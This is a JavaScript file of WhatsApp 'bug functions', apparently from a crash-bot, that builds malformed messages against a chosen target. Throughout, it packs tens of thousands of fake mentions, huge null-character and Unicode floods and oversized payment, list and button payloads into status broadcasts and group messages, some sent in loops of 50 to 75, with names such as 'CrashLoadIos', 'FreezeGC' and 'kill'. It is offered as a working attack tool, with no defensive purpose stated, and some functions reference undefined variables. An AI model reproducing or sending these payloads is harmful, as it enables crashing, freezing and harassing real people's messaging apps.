async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await devtrust.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
//==≠==========================
async function protocolbug6(target, mention) {
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "BoomXSuper",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Yamete" + "ោ៝".repeat(10000),
        title: "Hentai",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: "KIMOCHI",
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(1000)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363420088299543@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await devtrust.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//===============================
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await devtrust.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
//======================================
async function delayMakerInvisible(isTarget) {
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `—͟͞͞🧊 공격 *CYBER XMD* ${"—͟͞͞🧊 공격 *CYBER XMD*".repeat(10)}`,
contentType: 3,
accessibilityText: `—͟͞͞🧊 공격 *CYBER XMD* ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: isTarget
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await devtrust.relayMessage(isTarget, message, {
participant: {
jid: isTarget
}
});
}
//================================°==
async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "*CYBER XMD is Here bitches*",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "*CYBERt Bothering Me Bro!!*"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
   
    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await devtrust.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "*CYBER crasher Here Bro*" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function FreezeGC(FuckMark, jids = false) {
      var messageContent = generateWAMessageFromContent(FuckMark, proto.Message.fromObject({
             'viewOnceMessage': {
                    'message': {
                           "newsletterAdminInviteMessage": {
                                  "newsletterJid": `120363420088299543@newsletter`,
                                  "newsletterName": "AditJmK" + "48".repeat(80000) + "\u0000".repeat(920000),
                                  "jpegThumbnail": "",
                                  "caption": `JMK 4EvER`,
                                  "inviteExpiration": Date.now() + 1814400000
                           }
                    }
             }
      }), {
             'userJid': FuckMark
      });
      await devtrust.relayMessage(FuckMark, messageContent.message, jids ? {
             'participant': { 
                   'jid': FuckMark
             }
      } : {});
}

async function CrashLoadIos(devtrust, target) {
  const LocationMessage = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/rizxvelzdev",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

  await devtrust.relayMessage(target, LocationMessage, {
    participant: { jid: target }
  });
  console.log(randomColor()(`─────「 ⏤!CrashIOS To: ${target}!⏤ 」─────`))
}
// BUG FUNCTIONS
async function crashChannel(target) {
  await devtrust.relayMessage(target, {
    viewOnceMessage: {
      message: {
        groupStatusMentionMessage: {
          name: "CYBER - ᴄʀᴀsʜ",
          jid: target,
          mention: ["13135550002@s.whatsapp.net"],
          contextInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          }
        }
      }
    }
  }, {});
}
// BUG FUNCTIONS
async function swVidFreeze(target, sebut = false) {
  for(let z = 0; z < 50; z++) {
    const media = generateWAMessageFromContent(target, {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "OU+MmRfL9SSO0MZI2VcrC8/Vqr8U+bkKE/bnTg74YY8=",
        fileLength: 252408,
        seconds: 15,
        mediaKey: "Nw/2xPEw0z5yDWluRdpNDAZn8lWUFH1Ui6yjpUoDHpk=",
        height: 816,
        width: 768,
        fileEncSha256: "vz7HOSPHOcj3R8De5glz20ktBJIt8LhkN8gX5t2nLNI=",
        directPath: "/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1761536267,
        caption: "Radiation - Ex3cutor" + "ꦾ".repeat(22), 
        contextInfo: {
          statusAttributionType: 2,
          isForwarded: true, 
          forwardingScore: 7202508,
          forwardedAiBotMessageInfo: {
            botJid: "13135550002@bot", 
            botName: "Meta AI", 
            creatorName: "7eppeli - Yuukey"
          }, 
          mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        streamingSidecar: "ZCTXLaWRSUS57M2WDi5Rmxk1kq9Jm8uPJAtt0Qm2Pdxh3hRYFM3IOg==",
        thumbnailDirectPath: "/v/t62.36147-24/531652303_1341445584346193_3521117362172863397_n.enc?ccb=11-4&oh=01_Q5Aa2wEK08NNxekWOl2uTJONY8JpIjdWijZ8uBMRvlhIv7lFWw&oe=6926531E&_nc_sid=5e03e0",
        thumbnailSha256: "XFmelyVsc04pajE/UH7cqxRIbOT8FF2PPqnjo/jIdDg=",
        thumbnailEncSha256: "B4u4FhVwI1OC3DTOuSLxwv5NKTJ5s3YFfZ/oqrI8hpE=",
        annotations: [
          {
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "1328419335741957",
                songId: "1221313878044460",
                author: "7eppeli.pdf",
                title: "ꦾ".repeat(9000),
                artworkDirectPath: "/v/t62.76458-24/538001898_1721507205206204_1856297105077950312_n.enc?ccb=11-4&oh=01_Q5Aa2wG6vgDeEBNpBou9E_hlOwfQid9sttzm8sXIT_GL-MyJYQ&oe=692643CB&_nc_sid=5e03e0",
                artworkSha256: "DQIz0Oj5q9X3DMmLIAEZ+0dGN0tVWWhKx7AMgOtuhCs=",
                artworkEncSha256: "pzljQhAsS8uKKVvBHwYhjFhYXb2oz7Ha6io5qu7oBW4=",
                artistAttribution: "https://id.Zeppeli.pdf",
                countryBlocklist: "+62",
                isExplicit: true,
                artworkMediaKey: "+O9eJ1/zuS2GRYDWkHgK7nohkP5zRIMAEhnmObrU6E0="
              }
            },
            embeddedAction: true
          }
        ]
      }
    }, {});
    const additionalNodes = [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              }
            ],
          }
        ],
      }
    ];
    await devtrust.relayMessage("status@broadcast", media.message, {
      messageId: media.key.id,
      statusJidList: [target],
      additionalNodes,
    });
  }
  if(sebut) {
    let devtrust = generateWAMessageFromContent(target, proto.Message.fromObject({
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: media.key,
            type: "STATUS_MENTION_MESSAGE",
            timestamp: Date.now() + 720,
          },
        },
      }
    }), {})
    await devtrust.relayMessage(target, demmy.message, {
      participant: { jid:target }, 
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        }
      ],
    });
  }
}
// end of Bug function
// BUG FUNCTIONS 
async function gsInter(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await devtrust.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug function 
// BUG FUNCTIONS
async function Delay1(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await devtrust.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug function 
// BUG FUNCTIONS 
async function delay2(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await devtrust.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug function 
// BUG FUNCTIONS 
async function kill(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await devtrust.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug functions
//=========== ONE MESSAGE FC =========//
async function oneMsgFC(devtrust, target) {
  const sockUrl = 'https://files.catbox.moe/mxg7vh.mp4';
  const video = await prepareWAMessageMedia(
    { video: { url: sockUrl } },
    { upload: demmy.waUploadToServer }
  );

  const videoMessage = {
    videoMessage: video.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: String(Date.now()),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: [target],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "</> 𝙳εmmყ τεch 🪬 ཀ‌",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const cards = [];
  for (let i = 0; i < 10; i++) {
    cards.push({
      header: videoMessage,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "" },
          carouselMessage: {
            cards: cards,
            messageVersion: 1
          },
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: target
            },
            stanzaId: String(Math.floor(Math.random() * 99999)),
            forwardingScore: 100,
            isForwarded: true,
            mentionedJid: [target],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "radιaтιon craѕн ғc",
              mediaType: 1,
              mediaUrl: "",
              sourceUrl: "</> 𝙳εmmყ τεch 🪬 ཀ‌",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const message = generateWAMessageFromContent(target, interactive, { quoted: m});

  await devtrust.relayMessage(target, message.message, {
    participant: { jid: target },
    messageId: message.key.id
  });
}
//=================END OF FUNCTION====//
// BUG FUNCTIONS 
async function rageioshere(target) {
let tmsg = await generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: '@Radiation\n' + "\n\n\n" + "𑪆".repeat(60000),
                    previewType: 0,
                    contextInfo: {
                        mentionedJid: [target]
                    }
                }
    }, {});

    await devtrust.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                }],
            }],
        }],
    });
}
// end of Bug function 
// BUG FUNCTIONS
